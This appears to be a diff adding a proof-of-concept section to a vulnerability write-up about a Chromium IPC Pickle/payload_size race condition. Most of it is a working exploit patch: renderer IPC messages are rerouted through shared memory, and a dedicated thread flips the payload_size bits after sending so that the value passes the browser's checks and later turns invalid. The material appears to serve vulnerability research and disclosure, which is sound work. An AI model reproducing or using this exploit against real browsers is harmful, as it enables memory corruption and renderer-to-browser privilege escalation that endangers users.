@@ -175,7 +175,126 @@ class BASE_EXPORT PickleIterator {
 
   **Poc**
 
-  
+  We can write code in source file
+
+  The attached patch forces all legacy IPC messages sent by renderers to be sent as *shared memory*, and *creates a new thread* in each renderer that *flips the high bits of the payload_size* value for a short period after each message is sent; this has a "reasonable" chance of having valid values to pass through the checks, and then invalid values later on.
+  ```diff
+diff --git a/ipc/ipc_message_pipe_reader.cc b/ipc/ipc_message_pipe_reader.cc
+index 6e7bf51b0e05..2d3b57e7a205 100644
+--- a/ipc/ipc_message_pipe_reader.cc
++++ b/ipc/ipc_message_pipe_reader.cc
+@@ -6,10 +6,13 @@
+ 
+ #include <stdint.h>
+ 
++#include <iostream>
+ #include <utility>
+ 
+ #include "base/bind.h"
+ #include "base/callback_helpers.h"
++#include "base/command_line.h"
++#include "base/debug/stack_trace.h"
+ #include "base/location.h"
+ #include "base/logging.h"
+ #include "base/macros.h"
+@@ -18,6 +21,13 @@
+ #include "ipc/ipc_channel_mojo.h"
+ #include "mojo/public/cpp/bindings/message.h"
+ 
++std::string GetProcessType() {
++  std::string type = base::CommandLine::ForCurrentProcess()->GetSwitchValueASCII("type");
++  if (type == "")
++    return "browser";
++  return type;
++}
++
+ namespace IPC {
+ namespace internal {
+ 
+@@ -35,6 +45,10 @@ MessagePipeReader::MessagePipeReader(
+   receiver_.set_disconnect_handler(
+       base::BindOnce(&MessagePipeReader::OnPipeError, base::Unretained(this),
+                      MOJO_RESULT_FAILED_PRECONDITION));
++  if (GetProcessType() == "renderer") {
++    race_thread_ = std::make_unique<base::Thread>("race_thread");
++    race_thread_->Start();
++  }
+ }
+ 
+ MessagePipeReader::~MessagePipeReader() {
+@@ -49,6 +63,17 @@ void MessagePipeReader::Close() {
+     receiver_.reset();
+ }
+ 
++static void race_ipc_message(mojo::ScopedSharedBufferHandle shm_handle) {
++  auto mapping = shm_handle->Map(0x100);
++  fprintf(stderr, "racing\n");
++  volatile uint32_t* ptr = (volatile uint32_t*)mapping.get();
++  for (int i = 0; i < 0x80000; ++i) {
++    *ptr ^= 0x23230000;
++  }
++  *ptr ^= 0x23230000;
++  fprintf(stderr, "done racing\n");
++}
++
+ bool MessagePipeReader::Send(std::unique_ptr<Message> message) {
+   CHECK(message->IsValid());
+   TRACE_EVENT_WITH_FLOW0("toplevel.flow", "MessagePipeReader::Send",
+@@ -62,9 +87,27 @@ bool MessagePipeReader::Send(std::unique_ptr<Message> message) {
+   if (!sender_)
+     return false;
+ 
+-  sender_->Receive(MessageView(*message, std::move(handles)));
+-  DVLOG(4) << "Send " << message->type() << ": " << message->size();
+-  return true;
++  if (GetProcessType() == "renderer") {
++    auto shm_handle = mojo::SharedBufferHandle::Create(message->size() > 0x1000 ? message->size() : 0x1000);
++    auto shm_handle_copy = shm_handle->Clone(mojo::SharedBufferHandle::AccessMode::READ_WRITE);
++
++    mojo_base::internal::BigBufferSharedMemoryRegion shm_region(std::move(shm_handle), message->size());
++    memcpy(shm_region.memory(), message->data(), message->size());
++    mojo_base::BigBufferView big_buffer_view;
++    big_buffer_view.SetSharedMemory(std::move(shm_region));
++
++    race_thread_->task_runner()->PostTask(FROM_HERE, 
++      base::BindOnce(race_ipc_message, std::move(shm_handle_copy)));
++
++    sender_->Receive(MessageView(std::move(big_buffer_view), std::move(handles)));
++
++    DVLOG(4) << "Send " << message->type() << ": " << message->size();
++    return true;
++  } else {
++    sender_->Receive(MessageView(*message, std::move(handles)));
++    DVLOG(4) << "Send " << message->type() << ": " << message->size();
++    return true;
++  }
+ }
+ 
+ void MessagePipeReader::GetRemoteInterface(
+diff --git a/ipc/ipc_message_pipe_reader.h b/ipc/ipc_message_pipe_reader.h
+index b7f73d2a9aee..6c26987dadcd 100644
+--- a/ipc/ipc_message_pipe_reader.h
++++ b/ipc/ipc_message_pipe_reader.h
+@@ -15,6 +15,7 @@
+ #include "base/component_export.h"
+ #include "base/macros.h"
+ #include "base/process/process_handle.h"
++#include "base/threading/thread.h"
+ #include "base/threading/thread_checker.h"
+ #include "ipc/ipc.mojom.h"
+ #include "ipc/ipc_message.h"
+@@ -106,6 +107,9 @@ class COMPONENT_EXPORT(IPC) MessagePipeReader : public mojom::Channel {
+   Delegate* delegate_;
+   mojo::AssociatedRemote<mojom::Channel> sender_;
+   mojo::AssociatedReceiver<mojom::Channel> receiver_;
++
++  std::unique_ptr<base::Thread> race_thread_;
++
+   base::ThreadChecker thread_checker_;
+ 
+   DISALLOW_COPY_AND_ASSIGN(MessagePipeReader);
+
+  ```
 
 
 </details>
